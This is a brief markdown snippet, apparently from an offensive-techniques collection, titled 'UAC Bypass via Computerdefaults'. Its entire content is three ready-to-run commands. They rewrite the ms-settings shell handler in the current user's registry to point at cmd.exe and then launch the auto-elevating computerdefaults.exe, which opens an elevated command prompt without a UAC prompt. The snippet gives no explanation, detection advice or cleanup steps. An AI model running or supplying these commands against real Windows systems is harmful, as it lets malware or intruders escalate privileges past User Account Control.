# UAC Bypass via Computerdefaults

```powershell
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /t REG_SZ /d "cmd.exe" /f
start computerdefaults.exe
```